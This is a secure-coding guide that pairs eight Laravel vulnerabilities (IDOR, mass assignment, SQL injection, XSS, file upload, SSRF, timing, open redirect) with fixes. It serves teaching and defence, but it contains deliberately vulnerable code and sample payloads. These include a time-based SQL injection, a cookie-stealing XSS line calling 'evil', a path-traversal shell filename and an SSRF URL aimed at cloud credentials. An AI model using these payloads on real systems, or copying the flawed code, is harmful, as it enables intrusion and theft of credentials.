# Eight real vulnerabilities and their fixes

Every one of these has appeared in production Laravel applications.

---

## 1. IDOR — the most common serious bug

```php
// ✗
Route::get('/invoices/{id}', function (int $id) {
    return view('invoices.show', ['invoice' => Invoice::findOrFail($id)]);
})->middleware('auth');
```

Any logged-in user increments the ID and reads every invoice in the system. `auth`
middleware is present, so it looks protected. It is not.

```php
// ✓
Route::get('/invoices/{invoice}', ShowInvoiceController::class)->middleware('auth');
```

```php
final class ShowInvoiceController
{
    public function __invoke(Request $request, Invoice $invoice): View
    {
        $this->authorize('view', $invoice);

        return view('invoices.show', compact('invoice'));
    }
}
```

```php
public function view(User $user, Invoice $invoice): Response
{
    return $user->tenant_id === $invoice->tenant_id
        ? Response::allow()
        : Response::denyAsNotFound();       // 404 — a 403 confirms the record exists
}
```

Test it:

```php
it('returns 404 for another tenant\'s invoice', function (): void {
    actingAs(User::factory()->create())
        ->get(route('invoices.show', Invoice::factory()->create()))
        ->assertNotFound();
});
```

---

## 2. Mass assignment → privilege escalation

```php
// ✗
class User extends Model
{
    protected $guarded = [];
}

public function update(Request $request, User $user)
{
    $user->update($request->all());
    return back();
}
```

`POST /profile` with `is_admin=1` in the body. Done.

```php
// ✓
class User extends Model
{
    protected $fillable = ['name', 'email', 'bio', 'avatar_path'];
}

public function update(UpdateProfileRequest $request, User $user): RedirectResponse
{
    $this->authorize('update', $user);

    $user->update($request->validated());

    return back()->with('status', __('Profile updated.'));
}
```

```php
// AppServiceProvider — an unexpected attribute now throws in development
Model::preventSilentlyDiscardingAttributes(! app()->isProduction());
```

---

## 3. SQL injection through the sort parameter

```php
// ✗ Eloquent parameterises where(); orderByRaw does not.
$orders = Order::where('tenant_id', $tenantId)
    ->orderByRaw($request->input('sort').' '.$request->input('direction'))
    ->paginate(20);
```

`?sort=(SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'
THEN SLEEP(5) ELSE 0 END)` — a blind time-based extraction of the admin password hash.

```php
// ✓ Column names cannot be parameterised, so whitelist them.
private const SORTABLE = ['created_at', 'total', 'reference', 'status'];

$column = in_array($request->input('sort'), self::SORTABLE, true)
    ? $request->input('sort')
    : 'created_at';

$direction = $request->input('direction') === 'asc' ? 'asc' : 'desc';

$orders = Order::where('tenant_id', $tenantId)
    ->orderBy($column, $direction)
    ->paginate(20);
```

Better still, validate it so the user gets a real error:

```php
'sort'      => ['sometimes', Rule::in(self::SORTABLE)],
'direction' => ['sometimes', Rule::in(['asc', 'desc'])],
```

---

## 4. Stored XSS through a "rich text" field

```blade
{{-- ✗ --}}
<div class="post-body">{!! $post->body !!}</div>
```

A user saves `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`. Every
reader's session is exfiltrated.

```php
// ✓ Sanitise on the way in, with an allow-list
use HTMLPurifier;

final class SanitiseHtml
{
    public function handle(string $html): string
    {
        return app(HTMLPurifier::class)->purify($html);
    }
}
```

```php
protected function body(): Attribute
{
    return Attribute::set(fn (string $value): string => app(SanitiseHtml::class)->handle($value));
}
```

Plus defence in depth — the CSP means an injected script cannot run even if sanitisation
fails:

```
Content-Security-Policy: script-src 'self' 'nonce-{random}' 'strict-dynamic'
```

Plus `http_only` cookies, so `document.cookie` returns nothing useful.

Three independent layers. Any one of them can fail.

---

## 5. The unrestricted file upload

```php
// ✗
$request->validate(['avatar' => 'required|image|max:2048']);

$path = $request->file('avatar')->storeAs(
    'public/avatars',
    $request->file('avatar')->getClientOriginalName()     // attacker-controlled
);
```

Three vulnerabilities:
- `image` and `mimes` check the **extension**, not the content. A PHP file named
  `shell.jpg.php` passes.
- The client filename allows path traversal: `../../../../public/shell.php`.
- Stored in `public/`, so it is directly executable if the extension lands right.

```php
// ✓
$request->validate([
    'avatar' => [
        'required',
        'file',
        'max:2048',
        'mimetypes:image/jpeg,image/png,image/webp',   // sniffs actual content
        'dimensions:max_width=4000,max_height=4000',
    ],
]);

$file = $request->file('avatar');

$path = $file->storeAs(
    'avatars',
    Str::ulid().'.'.$file->extension(),                 // we generate the name
    'private'                                           // outside the web root
);
```

```php
// Served through an authorizing controller
Route::get('/avatars/{user}', function (User $user) {
    Gate::authorize('view', $user);

    return Storage::disk('private')->response($user->avatar_path);
})->middleware('auth');
```

Plus web server config that refuses to execute anything in the upload directory. Full
pipeline: `laravel-media-management`.

---

## 6. SSRF through a webhook URL

```php
// ✗
$response = Http::get($request->input('callback_url'));
```

`callback_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns
the instance's AWS credentials.

```php
// ✓
final class SafeOutboundUrl
{
    public function validate(string $url): string
    {
        $parts = parse_url($url);

        throw_unless(
            in_array($parts['scheme'] ?? '', ['http', 'https'], true),
            ValidationException::withMessages(['callback_url' => __('Only HTTP and HTTPS are allowed.')])
        );

        $host = $parts['host'] ?? '';
        $ip   = gethostbyname($host);

        // Reject private, loopback, link-local, and reserved ranges
        throw_unless(
            filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE),
            ValidationException::withMessages(['callback_url' => __('That address is not allowed.')])
        );

        return $url;
    }
}
```

```php
Http::withOptions(['allow_redirects' => false])   // a permitted URL can redirect to 169.254.169.254
    ->timeout(5)
    ->get($safe->validate($request->input('callback_url')));
```

`allow_redirects => false` is essential — validating the first URL is pointless if the
client follows a redirect to a private address.

Infrastructure defence too: block egress to link-local and private ranges from the
application's security group, and use IMDSv2 which requires a token.

---

## 7. Timing attack on a token comparison

```php
// ✗ String comparison short-circuits on the first differing byte
public function verify(Request $request): Response
{
    if ($request->header('X-API-Key') === config('services.partner.key')) {
        return $this->process($request);
    }

    abort(401);
}
```

Measurable timing differences let an attacker recover the key byte by byte. It is slower
over a network than in a lab, but it is a real technique.

```php
// ✓ Constant-time
if (hash_equals(config('services.partner.key'), (string) $request->header('X-API-Key'))) {
```

Use `hash_equals` for every secret comparison: API keys, webhook signatures, password reset
tokens, MFA codes, signed URL signatures.

Webhook verification:

```php
$expected = hash_hmac('sha256', $request->getContent(), config('services.stripe.webhook_secret'));

abort_unless(hash_equals($expected, (string) $request->header('Stripe-Signature')), 401);
```

Verify **before** parsing the body. Parsing untrusted JSON before authenticating it is
attack surface.

---

## 8. Open redirect in the login flow

```php
// ✗
return redirect($request->input('next', '/dashboard'));
```

`https://yourapp.com/login?next=https://yourapp-phishing.com` — the user sees your domain,
logs in, and is redirected to a convincing clone that harvests the credentials again.

```php
// ✓ Relative paths only
$next = (string) $request->input('next', '/dashboard');

$safe = Str::startsWith($next, '/') && ! Str::startsWith($next, '//')
    ? $next
    : '/dashboard';

return redirect($safe);
```

The `//` check is essential — `//evil.com` is a protocol-relative URL that browsers treat
as absolute.

Better, when it fits: use Laravel's built-in intended-URL mechanism, which stores the target
server-side rather than accepting it from the request.

```php
return redirect()->intended(route('dashboard'));
```

---

## What they have in common

| Vulnerability | Root cause |
|---|---|
| IDOR | Authentication mistaken for authorization |
| Mass assignment | Convenience default (`$guarded = []`) left in place |
| SQL injection | An input that could not be parameterised, not whitelisted |
| XSS | Trusting stored data because it was "our" data |
| File upload | Validating the extension instead of the content |
| SSRF | Treating a URL as data rather than as a capability |
| Timing attack | Using the obvious comparison operator |
| Open redirect | Trusting a request parameter to choose a destination |

Six of eight are **trusting something that arrived from outside**. The seventh and eighth
are defaults that are convenient rather than safe.

The habit that prevents all of them: for every value, ask *where did this come from, and
what does the system let it do?*
